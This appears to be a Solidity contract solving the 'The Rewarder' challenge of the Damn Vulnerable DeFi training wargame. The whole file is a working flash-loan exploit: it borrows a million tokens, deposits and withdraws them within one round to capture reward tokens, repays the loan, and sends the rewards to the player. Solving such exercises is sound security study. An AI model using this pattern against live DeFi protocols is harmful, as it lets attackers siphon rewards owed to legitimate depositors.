// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract RewarderAttack {

    FlashLoanerPool public loanPool;
    TheRewarderPool public rewarderPool;
    RewardToken public rewardToken;
    address private player;
    DamnValuableToken dvtToken;
    uint256 loanAmount = 1000000 ether;

    constructor(
        FlashLoanerPool _loanPool, 
        TheRewarderPool _rewarderPool, 
        address _player, 
        RewardToken _rewardToken,
        DamnValuableToken _dvtToken) {
            loanPool = _loanPool;
            rewarderPool = _rewarderPool;
            player = _player;
            rewardToken = _rewardToken;
            dvtToken = _dvtToken;
    }

    // Exploit the FlashLoan low level call. The contract will call my receiveFlashLoan sending me
    // the amount of DVTs I requested. 
    function callLoan() public {
        loanPool.flashLoan(loanAmount);
    }

    // Have to:
    // 1. Deposit in pool (requires approval to rewarderPool as spender)
    // 2. avoid time restriction (increment round (5 days) before calling this function)
    // 3. Withdraw
    // 4. pay back the loan
    function receiveFlashLoan(uint256 amount) external {
        dvtToken.approve(address(rewarderPool), amount);
        // the deposit function internally distributes the rewards if a new round is detected
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        dvtToken.transfer(address(loanPool), amount);
    }

    function withdrawRewards() external {
        require(msg.sender == player, "Not the player");
        uint playerReward = rewardToken.balanceOf(address(this));
        require(playerReward > 0, "0 RWT");
        rewardToken.transfer(player, playerReward);
    }

    receive() external payable { }

    fallback() external payable { }
}